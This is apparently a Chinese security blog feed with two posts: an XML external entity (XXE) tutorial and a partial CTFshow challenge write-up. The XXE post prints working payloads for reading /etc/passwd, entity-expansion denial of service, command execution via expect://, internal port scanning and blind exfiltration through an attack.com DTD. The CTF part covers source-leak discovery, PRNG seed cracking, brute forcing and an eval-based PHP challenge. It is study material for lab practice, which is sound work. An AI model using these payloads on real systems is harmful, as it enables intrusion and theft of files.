<pre><code class="highlight plaintext">&lt;payment Luckey=&quot;Q&quot; /&gt;</code></pre>

<p>以下是 属性类型的选项</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20191202150821-85ef2e3e-14d2-1.png" alt="20191202150821-85ef2e3e-14d2-1"></p>
<p>默认属性值可使用下列值：</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20191202150849-96eb9a7e-14d2-1.png" alt="20191202150849-96eb9a7e-14d2-1"></p>
<p><strong>DTD实体</strong></p>
<blockquote>
<p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。<br>实体引用是对实体的引用。<br>实体可在内部或外部进行声明。</p>
</blockquote>
<p><em>按实体有无参分类，实体分为一般实体和参数实体</em><br><em>一般实体的声明</em>：<code>&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;</code><br>引用一般实体的方法：<code>&amp;实体名称;</code><br>ps：经实验，普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。</p>
<p><em>参数实体的声明</em>：<code>&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;</code><br>引用参数实体的方法：<code>%实体名称;</code><br>ps：经实验，参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用。<br>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
<p><em>按实体使用方式分类，实体分为内部声明实体和引用外部实体</em><br><em>内部实体</em></p>
<pre><code class="highlight plaintext">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></pre>

<p>内部实体示例代码：</p>
<pre><code class="highlight plaintext">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;
&lt;!DOCTYPE test [
    &lt;!ENTITY writer &quot;Dawn&quot;&gt;
    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;
]&gt;
&lt;test&gt;&amp;writer;©right;&lt;/test&gt;</code></pre>

<p><em>外部实体</em><br>外部实体，用来引入外部资源。有<code>SYSTEM</code>和<code>PUBLIC</code>两个关键字，表示实体来自本地计算机还是公共计算机。</p>
<pre><code class="highlight plaintext">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;
或者
&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></pre>

<p>外部实体示例代码：</p>
<pre><code class="highlight plaintext">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;
&lt;!DOCTYPE test [
    &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
    &lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;
]&gt;
&lt;author&gt;&amp;file;©right;&lt;/author&gt;</code></pre>

<p>外部实体可支持http、file等协议。不同程序支持的协议不同：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191202150935-b26e4a30-14d2-1.png" alt="img"><br>PHP支持的协议会更多一些，但需要一定的扩展：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191202151023-cf02c3ba-14d2-1.png" alt="img"><br>PHP引用外部实体，<strong>常见的利用协议</strong>：</p>
<pre><code class="highlight plaintext">file://文件绝对路径 如：file:///etc/passwd
http://url/file.txt
php://filter/read=convert.base64-encode/resource=xxx.php</code></pre>

<p><em>参数实体+外部实体</em></p>
<pre><code class="highlight plaintext">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</code></pre>

<p>参数实体+外部实体示例代码：</p>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE test [
  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
  %file;
]&gt;</code></pre>

<p><code>%file</code>(参数实体)是在DTD中被引用的，而<code>&amp;file;</code>是在xml文档中被引用的。</p>
<h2 id="XML外部实体注入-XXE"><a href="#XML外部实体注入-XXE" class="headerlink" title="XML外部实体注入(XXE)"></a>XML外部实体注入(XXE)</h2><h3 id="XXE漏洞简介"><a href="#XXE漏洞简介" class="headerlink" title="XXE漏洞简介"></a>XXE漏洞简介</h3><p>XXE漏洞全称XML External Entity Injection 即XML外部实体注入。<br>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成<strong>任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击</strong>等危害。<br>XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p>
<p>解析xml在php库libxml，libxml&gt;&#x3D;2.9.0的版本中没有XXE漏洞</p>
<h3 id="XXE常见利用方式"><a href="#XXE常见利用方式" class="headerlink" title="XXE常见利用方式"></a>XXE常见利用方式</h3><p>与SQL相似，XXE漏洞也分为有回显和无回显<br>有回显，可以直接在页面中看到payload的执行结果或现象。<br>无回显，又称为blind xxe，可以使用外带数据(OOB)通道提取数据。即可以引用远程服务器上的XML文件读取文件。</p>
<h4 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h4><p>首先准备一个有XXE漏洞的文件，这里以php文件为例<br>示例代码</p>
<pre><code class="highlight plaintext">&lt;?php
$xml = simplexml_load_string($_REQUEST[&#x27;xml&#x27;]);
print_r($xml);//注释掉该语句即为无回显的情况
?&gt;</code></pre>

<p>构造payload</p>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY file SYSTEM &quot;file:///d://qwzf.txt&quot; &gt;
]&gt;
&lt;root&gt;
&lt;name&gt;&amp;file;&lt;/name&gt;
&lt;/root&gt;
或者
&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE data [
&lt;!ELEMENT data (#ANY)&gt;
&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
]&gt;
&lt;data&gt;&amp;file;&lt;/data&gt;</code></pre>

<p>如果搭配vps弹shell的话需要在自己的VPS上写一个dtd</p>
<pre><code class="highlight plaintext"></code></pre>



<h4 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h4><pre><code class="highlight plaintext">&lt;!DOCTYPE data [
&lt;!ELEMENT data (#ANY)&gt;
&lt;!ENTITY a0 &quot;dos&quot; &gt;
&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;
&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;
]&gt;
&lt;data&gt;&amp;a2;&lt;/data&gt;</code></pre>

<p>若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。 具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。</p>
<p>大概的逻辑就是通过嵌套占用服务器的资源，来造成服务器的服务崩溃</p>
<h4 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h4><pre><code class="highlight plaintext">&lt;?xml version = &quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
		&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;
]&gt;
&lt;x&gt;&amp;xxe;&lt;/x&gt;</code></pre>

<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:8080“&gt;]&gt;
&lt;root&gt;
&lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/root&gt;</code></pre>

<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;http://attack.com/1.dto“&gt;]&gt;
&lt;root&gt;
&lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/root&gt;</code></pre>

<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE data SYSTEM &quot;http://publicServer.com/&quot; [
&lt;!ELEMENT data (#ANY)&gt;
]&gt;
&lt;data&gt;4&lt;/data&gt;</code></pre>

<h4 id="X-Include"><a href="#X-Include" class="headerlink" title="X-Include"></a>X-Include</h4><pre><code class="highlight plaintext">&lt;?xml version=&#x27;1.0&#x27;?&gt;
&lt;data xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include href=&quot;http://publicServer.com/file.xml&quot;&gt;&lt;/xi:include&gt;&lt;/data&gt;</code></pre>



]]></content>
      <tags>
        <tag>-Web</tag>
      </tags>
  </entry>
  <entry>
    <title>刷题蛆来咯-CTFshow</title>
    <url>/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/</url>
    <content><![CDATA[<h1 id="前面忘了，后面忘了，记录下就对了"><a href="#前面忘了，后面忘了，记录下就对了" class="headerlink" title="前面忘了，后面忘了，记录下就对了"></a>前面忘了，后面忘了，记录下就对了</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="web01"><a href="#web01" class="headerlink" title="web01"></a>web01</h3><p>入门，看源码，<code>view-source</code>&#x2F;F12</p>
<h3 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h3><p>写的无法查看就无法查看了吗?</p>
<p>非也非也</p>
<p><code>view-source</code></p>
<p>其实可以顺带观察一下源码的JS</p>
<pre><code class="highlight plaintext">&lt;script type=&quot;text/javascript&quot;&gt;
	window.oncontextmenu = function()&#123;return false&#125;;
	window.onselectstart = function()&#123;return false&#125;;
	window.onkeydown = function()&#123;if (event.keyCode==123)&#123;event.keyCode=0;event.returnValue=false;&#125;&#125;;
&lt;/script&gt;</code></pre>

<p>可以看到第一个控制了右击鼠标事件，第二个控制了选择事件，第三给控制了键盘输入</p>
<p>并且返回结果都是false，这样你当然就无法进行任何操作了啦啦啦</p>
<pre><code class="highlight plaintext">禁止鼠标右键：oncontextmenu=function()&#123;return false&#125;;
禁止选择：onselectstart=function()&#123;return false&#125;;
禁止拖放：ondragstart=function()&#123;return false&#125;;
禁止拷贝：oncopy=document.selection.empty() 。
禁止复制：oncopy = function()&#123;return false&#125;;
禁止保存：&lt;noscript&gt;&lt;iframe src=&quot;*.htm&quot;&gt;&lt;/iframe&gt;&lt;/noscript&gt;，放在head里面。
禁止粘贴：&lt;input type=text onpaste=function()&#123;return false&#125;;&gt;
禁止剪贴：oncut = function()&#123;return false&#125;;；
关闭输入法：&lt;input style=&quot;ime-mode:disabled&quot;&gt;</code></pre>



<h3 id="web03"><a href="#web03" class="headerlink" title="web03"></a>web03</h3><p>提示抓包，那就抓</p>
<p>bp发包直接看到flag在header里面</p>
<p>或者你F12看一眼<code>Network(网络)</code>刷新一下，点进url也可以从标头这里找到</p>
<h3 id="web04"><a href="#web04" class="headerlink" title="web04"></a>web04</h3><p>提示robots</p>
<p>那就是<code>robots.txt(爬虫协议)</code>，告诉你哪些可以爬，哪些不能爬来的</p>
<p>真实场景记得别手贱就好了。。CTF倒是无所谓</p>
<pre><code class="highlight plaintext">User-agent: *
Disallow: /flagishere.txt</code></pre>

<h3 id="web05"><a href="#web05" class="headerlink" title="web05"></a>web05</h3><p>提示<code>phps</code>源码泄露</p>
<p>众所周知</p>
<p><code>phps php~ php.bak</code>这些都是源码泄露，扫到就是赚到</p>
<h3 id="web06"><a href="#web06" class="headerlink" title="web06"></a>web06</h3><p>解压源码到当前目录是想赤紫蛋了，感觉是<code>www.zip</code>或者<code>.git</code>之类的</p>
<p>扫一下，是<a href="http://www.zip/">www.zip</a></p>
<p>下下来看到目录里有<code>index.php</code>和<code>fl000g.txt</code></p>
<p>打开一眼<code>fakeflag</code>，但是路径应该没错</p>
<p>闻着味摸过去拿到flag</p>
<h3 id="web07"><a href="#web07" class="headerlink" title="web07"></a>web07</h3><pre><code class="highlight plaintext">版本控制很重要，但不要部署到生产环境更重要。</code></pre>

<p>不懂，先吃我一扫</p>
<p>扫出来<code>/.git/</code>，直接给了</p>
<p>网上找了点解释</p>
<pre><code class="highlight plaintext">git 是一个版本控制工具，很多程序的开发都是多名程序员协同开发的，而 git 则是一个不错的多人协同工具+版本控制工具。

由于部署项目的方便，有很多运维人员直接在网站根目录使用 git clone 项目地址，此时网站根目录就会存在 .git 目录，通过该目录就可以回滚到某个版本或者下载最新的项目源码。
githack:https://github.com/BugScanTeam/GitHack</code></pre>

<h3 id="web08"><a href="#web08" class="headerlink" title="web08"></a>web08</h3><p>hint是一样的。。</p>
<p>那再吃我一扫,扫到<code>/.svn/</code>，也是直接给</p>
<h3 id="web09"><a href="#web09" class="headerlink" title="web09"></a>web09</h3><pre><code class="highlight plaintext">发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</code></pre>

<p>vim？那我可要闻着味过来了</p>
<p>vim强制关闭时会产生一个<code>.swp</code>文件</p>
<pre><code class="highlight plaintext">belike: index.php -&gt; index.php.swp</code></pre>

<p>下过来就直接给了</p>
<h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><pre><code class="highlight plaintext">cookie 只是一块饼干，不能存放任何隐私数据</code></pre>

<p>并非饼干，可以抓个包看看</p>
<p>抓到包直接Cookie: flag就写你脸上了</p>
<h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><pre><code class="highlight plaintext">域名其实也可以隐藏信息，比如flag.ctfshow.com 就隐藏了一条信息</code></pre>

<p>通过dns检查查询flag <a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a> TXT 记录，一般指为某个主机名或域名设置的说明。</p>
<p>查找flag.ctfshow.com域名下的txt记录</p>
<h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><pre><code class="highlight plaintext">有时候网站上的公开信息，就是管理员常用密码</code></pre>

<pre><code class="highlight plaintext">Help Line Number : 372619038</code></pre>

<p>扫出来一个<code>admin/index.php</code></p>
<p>登录成功力，直接拿到flag</p>
<h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><pre><code class="highlight plaintext">技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</code></pre>

<p>根据提示感觉像弱密码</p>
<p>结果是泄露。<code>/home</code>下面探一堆找到那个<code>Document</code></p>
<p>点进去就是一个使用指南，按所给信息登录就行</p>
<h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><pre><code class="highlight plaintext">有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</code></pre>

<p>仔细观察源码，看到一个路径<code>editor/upload/banner-app.png</code></p>
<p>upload被禁止访问了，只能到<code>/editor</code>翻一下</p>
<p>翻到一个插入文件，没想到能直接调用服务器本地文件系统。</p>
<p>翻一下</p>
<p>直接拿到flag<code>路径:nothinghere/fl000g.txt</code></p>
<h3 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h3><pre><code class="highlight plaintext">公开的信息比如邮箱，可能造成信息泄露，产生严重后果</code></pre>

<p>看一眼邮箱</p>
<pre><code class="highlight plaintext">1156631961@qq.com</code></pre>

<p>又扫到<code>/admin/</code>了</p>
<p>试一下都不对啊。是不是要忘记密码</p>
<p>要回答城市。。原来是社工题目吗哈哈。。</p>
<p>QQ找一下就好了</p>
<h3 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h3><pre><code class="highlight plaintext">对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</code></pre>

<p>用<code>wappalyzer</code>看一眼，语言是PHP，PHP探针没跑了，探针泄露路径<code>tz.php</code></p>
<p>发现可以直接查看<code>phpinfo()</code></p>
<p>直接摸到flag</p>
<h3 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h3><pre><code class="highlight plaintext">备份的sql文件会泄露敏感信息</code></pre>

<p>不知道指的是<code>.bak</code>的后缀还是什么</p>
<p>扫到一个<code>backup.sql</code></p>
<p>打开flag直接就在里面</p>
<h3 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h3><pre><code class="highlight plaintext">不要着急，休息，休息一会儿，玩101分给你flag</code></pre>

<p>看来是web前端题了</p>
<p>当然先看一眼有没有源码直接给</p>
<p>摸到一个unicode编码</p>
<pre><code class="highlight plaintext">\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b</code></pre>

<p>转换过来就是:你赢了，去幺幺零点皮爱吃皮看看</p>
<p><code>110.php</code></p>
<p>直接给了flag</p>
<h3 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h3><pre><code class="highlight plaintext">密钥什么的，就不要放在前端了</code></pre>

<p>看起来像一个密钥泄露嗯。。是flask的SECRET_KEY吗？还是什么。看一眼先</p>
<p>好吧高估了，就是一个判断逻辑放在了前端并且密码和用户都是明文</p>
<p>但是显示密码错误，猜测是放的密码是被加密过的</p>
<p>那么尝试抓包改密码看看这个加密是在前端还是在后端的</p>
<p>结果是前端，直接得到flag</p>
<h3 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h3><pre><code class="highlight plaintext">mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</code></pre>

<p>通过了解如果数据库未设置访问权限的话，是可以直接访问 把数据库给下载下来的</p>
<p>尝试通过默认名称<code>database.mdb</code>访问无果，但是扫到了<code>/db</code></p>
<p>但是访问不了，用一下递归扫描，摸到了<code>db.mdb</code></p>
<p>下载到本地用010搜一下关键字就可以</p>
<h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h3 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h3><pre><code class="highlight plaintext">爆破什么的，都是基操</code></pre>

<p>上来就弹是吧?上bp</p>
<p>这里了解一下bp的<strong>Custom iterator</strong>模式</p>
<p>可以将palyload分块处理</p>
<p>比如这题的账号密码其实是以这种方式存在的</p>
<pre><code class="highlight plaintext">base64encode(username:passwd)</code></pre>

<p>并且注入位置在<code>Authorization</code></p>
<p>记得把最后的<code>urlencode</code>给去掉</p>
<h3 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;
    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);
    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;
        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;
            <span class="keyword">echo</span> <span class="variable">$flag</span>;
        &#125;
    &#125;
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);

&#125;
<span class="meta">?&gt;</span></code></pre>

<p>具体要求是这样:</p>
<pre><code class="highlight plaintext">第2位要和第15位相等，第15位要和第18位相等
并且第2位+第15位+第18位/第2位要等于第32位</code></pre>

<pre><code class="highlight php"><span class="comment">#encoding=gbk</span>
import hashlib

def <span class="title function_ invoke__">check</span>(md5str):
    <span class="comment"># 提取对应位置的字符</span>
    c1 = md5str[<span class="number">1</span>]
    c2 = md5str[<span class="number">14</span>]
    c3 = md5str[<span class="number">17</span>]
    c4 = md5str[<span class="number">31</span>]

    <span class="comment"># 条件1：三个字符相等</span>
    <span class="keyword">if</span> c1 != c2 <span class="keyword">or</span> c2 != c3:
        <span class="keyword">return</span> False

    <span class="comment"># 条件2：计算表达式（转 int 前需确保是数字）</span>
    <span class="keyword">if</span> <span class="title function_ invoke__">not</span> (c1.<span class="title function_ invoke__">isdigit</span>() <span class="keyword">and</span> c4.<span class="title function_ invoke__">isdigit</span>()):
        <span class="keyword">return</span> False

    c = <span class="keyword">int</span>(c1)
    <span class="keyword">try</span>:
        result = (c + c + c) / c
    except ZeroDivisionError:
        <span class="keyword">return</span> False

    <span class="keyword">return</span> <span class="keyword">int</span>(result) == <span class="keyword">int</span>(c4)

<span class="comment"># 暴力枚举 token 值</span>
<span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">100000000</span>):
    token = <span class="title function_ invoke__">str</span>(i)
    md5val = hashlib.<span class="title function_ invoke__">md5</span>(token.<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">hexdigest</span>()
    <span class="keyword">if</span> <span class="title function_ invoke__">check</span>(md5val):
        <span class="keyword">print</span>(f<span class="string">&quot;[+] 找到符合条件的 token：&#123;token&#125;&quot;</span>)
        <span class="keyword">print</span>(f<span class="string">&quot;    md5: &#123;md5val&#125;&quot;</span>)
        <span class="keyword">break</span>
</code></pre>

<h3 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;
    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];
    <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);
    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;
        <span class="keyword">echo</span> <span class="variable">$flag</span>;
    &#125;
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);
&#125;</code></pre>

<p>一个伪随机数的问题。种子固定，随机值是固定的那几个</p>
<p>自己拿php跑一下这个种子的随机值传参即可</p>
<h3 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>

<span class="comment">/*</span>
<span class="comment"># -*- coding: utf-8 -*-</span>
<span class="comment"># <span class="doctag">@Author</span>: h1xa</span>
<span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:56:57</span>
<span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span>
<span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 15:47:33</span>
<span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span>
<span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span>
<span class="comment"></span>
<span class="comment">*/</span>


<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;
    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];
    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));
    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());
    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;
        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;
            <span class="keyword">echo</span> <span class="variable">$flag</span>;
        &#125;
    &#125;<span class="keyword">else</span>&#123;
        <span class="keyword">echo</span> <span class="variable">$rand</span>;
    &#125;
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);
&#125;
</code></pre>

<p>我们来理一下 </p>
<pre><code class="highlight plaintext">1.将flag:MD5编码--&gt;取[0:7]--&gt;作为hex转换成十进制--&gt;作为种子
2.比较token和2*mt_rand()</code></pre>

<p>还是好解决的，因为返回了<code>$rand</code>值，可以逆着推出<code>$mt_rand</code></p>
<p>这里是894610327</p>
<p>使用<code>php_mt_rand</code>工具来破解一下，并结合当前PHP版本得到了合适的种子</p>
<pre><code class="highlight plaintext">1324767434 
2626545208 
3845172103</code></pre>

<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/Users\ayano\AppData\Roaming\Typora\typora-user-images\image-20250709152756959.png" alt="image-20250709152756959"></p>
<p>运气不是很好啊。。那只能一个个试过去了</p>
<p>结果都没打出来，何意呢。。重新开了靶机再试，104429216</p>
<pre><code class="highlight plaintext">131270818
2698696663 
3895390800</code></pre>

<p>。？还是出不来，仔细再看一眼</p>
<p>搞错了搞成1+2了原来是2+3啊哈哈。。</p>
<p>最后试出来是第三个</p>
<h3 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h3><p>安装界面直接连接就说连上了。。好怪啊。</p>
<p>找找源码，找到一个<code>checkdb.php</code></p>
<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/Users\ayano\AppData\Roaming\Typora\typora-user-images\image-20250709160523122.png" alt="image-20250709160523122"></p>
<pre><code class="highlight plaintext">POST：a=&amp;p=&amp;u=&amp;d=&amp;pass=</code></pre>

<p>但是其实抓包抓一下可以直接看到flag的。<img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/Users\ayano\AppData\Roaming\Typora\typora-user-images\image-20250709161018103.png" alt="image-20250709161018103"></p>
<h3 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h3><p>本来以为是爆破admin的密码爆了半天没收获结果发现是让我爆破人身份证号码。</p>
<pre><code class="highlight plaintext">高先伊
621022********5237</code></pre>

<p>这边爆破一下日期</p>
<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/Users\ayano\AppData\Roaming\Typora\typora-user-images\image-20250709162357752.png" alt="image-20250709162357752"></p>
<p>爆破了半天得到621022199002015237</p>
<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/Users\ayano\AppData\Roaming\Typora\typora-user-images\image-20250709165512904.png" alt="image-20250709165512904"></p>
<p>登录就可以拿到flag</p>
<h3 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h3><p>挺邪门的题目，随便改URL的话会显示重定向过多</p>
<p>尝试把最后的去掉，对0和1的位置进行1-100遍历(问就是扫出来是1-100)</p>
<p>这里使用<code>Cluster bomb</code>模式</p>
<p><code>payload type</code>为<code>Numbers</code></p>
<p>对1和2位置都设置1-100</p>
<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/Users\ayano\AppData\Roaming\Typora\typora-user-images\image-20250709172439403.png" alt="image-20250709172439403"></p>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>好玩爱玩，好吃爱吃</p>
<p>喜欢我RCE吗</p>
<h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><pre><code class="highlight plaintext">&lt;?php
error_reporting(0);
if(isset($_GET[&#x27;c&#x27;]))&#123;
    $c = $_GET[&#x27;c&#x27;];
    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;
        eval($c);
    &#125;
    
&#125;else&#123;
    highlight_file(__FILE__);
